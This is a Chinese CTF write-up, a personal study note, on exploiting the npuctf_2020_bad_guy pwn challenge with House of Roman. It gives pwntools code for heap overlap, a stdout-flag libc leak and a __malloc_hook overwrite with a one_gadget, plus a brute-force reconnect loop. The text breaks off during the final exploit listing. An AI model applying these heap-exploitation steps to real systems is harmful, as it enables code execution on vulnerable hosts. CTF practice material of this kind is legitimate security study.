&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; ni&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Program received signal SIGALRM, Alarm clock.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0000555555400ced&lt;/span&gt; in &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*RAX  0&lt;span class=&#34;title function_&#34;&gt;x555555602040&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(heaparray)&lt;/span&gt; ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RBX  0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*RCX  0&lt;span class=&#34;title function_&#34;&gt;x555555400ced&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(add+&lt;span class=&#34;number&#34;&gt;92&lt;/span&gt;)&lt;/span&gt; ◂— mov rdx, qword ptr [rbp - 0x10]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;prog_init&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setvbuf(&lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setvbuf(&lt;span class=&#34;built_in&#34;&gt;stdout&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; alarm(&lt;span class=&#34;number&#34;&gt;0x3C&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;思路&#34;&gt;&lt;a href=&#34;#思路&#34; class=&#34;headerlink&#34; title=&#34;思路&#34;&gt;&lt;/a&gt;思路&lt;/h2&gt;&lt;p&gt;开了pie,应该先想办法泄漏地址,然后用onegadget覆盖malloc_hook等即可&lt;/p&gt;
&lt;h3 id=&#34;泄露地址&#34;&gt;&lt;a href=&#34;#泄露地址&#34; class=&#34;headerlink&#34; title=&#34;泄露地址&#34;&gt;&lt;/a&gt;泄露地址&lt;/h3&gt;&lt;p&gt;​	利用io stdout进行泄漏、(前期方便调试可以本地先关闭alsr)&lt;/p&gt;
&lt;p&gt;​	具体来说,要构造堆块重叠(&lt;strong&gt;类似double free感觉?如果不够造但是可以直接修改地址吗不是&lt;/strong&gt;), 修改_IO_2_1_stdout _的flags值(原理在最后) ,然后就可以泄露地址了&lt;/p&gt;
&lt;p&gt;​	构造四个堆块,free掉0x60的2号,然后利用edit的漏洞把1大小改为0x90,然后释放,然后通过malloc一个0x10大小堆块,使得剩余的堆块与释放的2号堆块重叠&lt;/p&gt;
&lt;p&gt;​	&lt;font color=&#34;red&#34;&gt;重叠的目的是把unsortedbin的fd的地址放到fastbin地址那里,让fastbin能利用这个地址进行申请&lt;/font&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   malloc(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   malloc(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   malloc(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   payload = p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x91&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;# + p64(0) * 3 + p64(0x91)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(payload),payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   malloc(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	没有malloc 0x10前,可以看到fastbin的位置,以及它的fd是没有值的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-44-houseofroman/Snipaste_2023-10-25_15-52-48.jpg&#34; alt=&#34;Snipaste_2023-10-25_15-52-48&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	malloc后&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-44-houseofroman/Snipaste_2023-10-25_16-13-46.jpg&#34; alt=&#34;Snipaste_2023-10-25_16-13-46&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	将后四字节修改为0x255，然后malloc两次就可以分到_IO_2_1_stdout _上面的位置,之所以要分配0x25dd那里,是因为要满足堆的大小检查要求&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload = p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x71&lt;/span&gt;) + p16(&lt;span class=&#34;number&#34;&gt;0x25dd&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#* 3 + p64(0x91)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(payload),payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   malloc(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   payload = &lt;span class=&#34;number&#34;&gt;0x33&lt;/span&gt; * p8(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0xfbad800&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; + p8(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   malloc(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-44-houseofroman/Snipaste_2023-10-25_16-17-59.jpg&#34; alt=&#34;Snipaste_2023-10-25_16-17-59&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	不满足要求的话会报错 &lt;strong&gt;Error in &amp;#96;.&amp;#x2F;npuctf_2020_bad_guy’: malloc(): memory corruption (fast): 0x00007ffff7dd25f5&lt;/strong&gt; ,这一块等分析源码的时候再细看&lt;/p&gt;
&lt;p&gt;​	malloc完之后,_IO_2_1_stdout的flags就被修改了， 也就是要修改对应flag的值 和 _IO_write_base, _IO_write_ptr, _IO_write_end等 就会自动输出缓存区的信息??????&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-44-houseofroman/Snipaste_2023-10-25_16-20-04.jpg&#34; alt=&#34;Snipaste_2023-10-25_16-20-04&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	然后就会泄露libc地址了,泄漏的地址是多少呢,是0x7ffff7dd2600,&lt;font color=&#34;red&#34;&gt;为啥呢?&lt;/font&gt;,减去偏移就得到了基址&lt;/p&gt;
&lt;p&gt; payload &amp;#x3D; 0x33 * p8(0) + p64(0xfbad800) + p64(0)*3 + p8(0)&lt;/p&gt;
&lt;p&gt;(0x33 &amp;#x3D; 51  &amp;#x3D; 6*8 + 3)   + 2  *  8 +1    &amp;#x3D; 8 * 8 + 4&lt;/p&gt;
&lt;p&gt;从 0xed那里开始输入数据, 0x33 * p8(0)  &amp;#x3D; 51, 而0x2620-0x25ed正好是51&lt;/p&gt;
&lt;h3 id=&#34;故伎重演-替换malloc-hook为onegadget&#34;&gt;&lt;a href=&#34;#故伎重演-替换malloc-hook为onegadget&#34; class=&#34;headerlink&#34; title=&#34;故伎重演,替换malloc_hook为onegadget&#34;&gt;&lt;/a&gt;故伎重演,替换malloc_hook为onegadget&lt;/h3&gt;&lt;p&gt;​	此时堆的布局的话,还有一个0x60大小的unsortedbin, 分了再free放进fastbin, 此时有地址了,就不需要那么麻烦再利用unsortedbin的地址了,直接edit修改就可以了,然后两次malloc把__malloc_hook那里改为onegadget&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   free(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   payload = p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x71&lt;/span&gt;) + p64(libc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__malloc_hook&amp;#x27;&lt;/span&gt;] - &lt;span class=&#34;number&#34;&gt;0x23&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#* 3 + p64(0x91)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(payload),payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   malloc(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   payload = &lt;span class=&#34;number&#34;&gt;0x13&lt;/span&gt; * p8(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(libc.offset_to_vaddr(one[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   malloc(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&#34;如何开启了alsr-如何爆破呢&#34;&gt;&lt;a href=&#34;#如何开启了alsr-如何爆破呢&#34; class=&#34;headerlink&#34; title=&#34;如何开启了alsr 如何爆破呢&#34;&gt;&lt;/a&gt;如何开启了alsr 如何爆破呢&lt;/h3&gt;&lt;p&gt;​	学到了, 这样获取错误, 以前自己写循环tryexcept这里一直有问题,回头可以试试用这里的是否可以&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        pwn()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; KeyboardInterrupt:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;node4.buuoj.cn&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;27593&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;#p = process(binary)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;#p = process(binary)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;node4.buuoj.cn&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;27593&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;strong&gt;枚举的话, 不用增加点偏移吗, 或者说偏移也有可能是0?&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;一些细节&#34;&gt;&lt;a href=&#34;#一些细节&#34; class=&#34;headerlink&#34; title=&#34;一些细节&#34;&gt;&lt;/a&gt;一些细节&lt;/h2&gt;&lt;h3 id=&#34;libc的版本&#34;&gt;&lt;a href=&#34;#libc的版本&#34; class=&#34;headerlink&#34; title=&#34;libc的版本&#34;&gt;&lt;/a&gt;libc的版本&lt;/h3&gt;&lt;p&gt;​	做题的话注意一下版本,buuctf用的是2.23-0ubuntu11_amd64,这个版本我在网上没找到,找到的没符号,自己编译的还报错(用ubuntu20编译的,不知道16是不是可以)&lt;/p&gt;
&lt;p&gt;​	不同版本偏移不一样&lt;/p&gt;
&lt;p&gt;​	但是那个2.23- 多少是一样的&lt;/p&gt;
&lt;h1 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h1&gt;&lt;p&gt;用的这位师傅的: &lt;a href=&#34;https://blog.csdn.net/csdn546229768/article/details/123717993&#34;&gt;https://blog.csdn.net/csdn546229768/article/details/123717993&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span 